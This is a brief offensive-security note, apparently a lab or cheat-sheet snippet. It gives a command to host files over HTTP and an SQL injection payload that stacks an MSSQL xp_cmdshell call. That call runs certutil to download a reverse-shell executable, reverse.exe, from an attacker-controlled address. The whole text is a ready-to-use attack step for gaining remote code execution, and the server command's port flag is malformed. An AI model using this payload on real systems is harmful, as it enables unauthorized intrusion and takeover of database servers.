python3 -m http.server -p 80
Use SQLi to download the reverse.exe from your httpserver
' UNION SELECT NULL, NULL; EXEC xp_cmdshell 'cmd /c certutil -urlcache -f http://192.168.45.230/reverse.exe C:\Windows\Temp\reverse.exe' --
